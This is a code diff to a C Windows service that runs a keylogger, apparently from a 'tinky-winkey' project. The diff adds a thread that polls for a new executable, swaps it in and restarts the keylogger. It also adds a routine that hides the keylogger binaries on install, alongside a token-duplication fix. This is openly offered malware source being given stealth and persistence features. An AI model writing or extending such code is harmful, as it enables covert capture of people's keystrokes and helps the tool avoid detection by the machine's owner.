@@ -142,7 +142,7 @@ void StartKeylogger(void)
     }
 
     HANDLE dupTokenHandle = NULL;
-    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupTokenHandle))ç
+    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupTokenHandle))
     {
         printf("DuplicateTokenEx failed: %lu\n", GetLastError());
         CloseHandle(tokenHandle);
@@ -168,6 +168,31 @@ void StartKeylogger(void)
     CloseHandle(processHandle);
 }
 
+int UpdateAvailable(const char* filePath)
+{
+    WIN32_FIND_DATA findFileData;
+    HANDLE handle = FindFirstFile(filePath, &findFileData);
+    int found = handle != INVALID_HANDLE_VALUE;
+    if (found) FindClose(handle);
+    return found;
+}
+
+DWORD WINAPI CheckForUpdates(LPVOID lpParam)
+{
+    (void)lpParam;
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+        if (UpdateAvailable("Z:\\tinky-winkey\\tinky\\srcs\\new_tinky.exe"))
+        {
+            StopKeylogger();
+            MoveFile("Z:\\tinky-winkey\\tinky\\srcs\\new_tinky.exe", "Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe");
+            StartKeylogger();
+        }
+        Sleep(60000);
+    }
+    return 0;
+}
+
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
     (void)argc;
@@ -184,11 +209,18 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     SetServiceStatus(hStatus, &ServiceStatus);
 
     StartKeylogger();
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckForUpdates, NULL, 0, NULL);
 
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
         Sleep(1000);
     }
+}
+
+void HideFiles(void)
+{
+    SetFileAttributes("Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe", FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes("Z:\\tinky-winkey\\winkey\\srcs\\winkey.exe", FILE_ATTRIBUTE_HIDDEN);
 }
 
 int main(int argc, char* argv[])
@@ -197,7 +229,9 @@ int main(int argc, char* argv[])
     {
         if (strcmp(argv[1], "install") == 0)
         {
-            return InstallService();
+            InstallService();
+            HideFiles();
+            return 0;
         }
         else if (strcmp(argv[1], "delete") == 0)
         {
